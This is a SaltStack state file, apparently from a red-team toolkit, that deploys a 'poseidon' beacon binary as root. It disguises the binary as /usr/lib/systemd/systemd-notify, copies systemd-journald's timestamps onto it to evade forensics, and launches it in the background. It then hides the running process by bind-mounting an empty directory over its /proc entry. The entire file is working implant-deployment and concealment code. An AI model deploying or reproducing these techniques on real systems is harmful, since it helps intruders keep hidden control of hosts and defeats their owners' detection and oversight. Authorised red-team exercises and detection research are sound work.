beacon:
  file.managed:
    - name: /usr/lib/systemd/systemd-notify
    - source: salt://redteam/beacons/poseidon.bin
    - user: root
    - group: root
    - mode: 755
    - create: True
  cmd.run:
    - name: touch -r /usr/lib/systemd/systemd-journald /usr/lib/systemd/systemd-notify
    - require:
      - file: beacon

run:
  cmd.run:
    - name: |
        nohup /usr/lib/systemd/systemd-notify >/dev/null 2>&1 &
        BEACON_PID=$!
        sleep 2
        mkdir -p /tmp/.empty
        mount --bind /tmp/.empty /proc/$BEACON_PID
    - require:
      - file: beacon
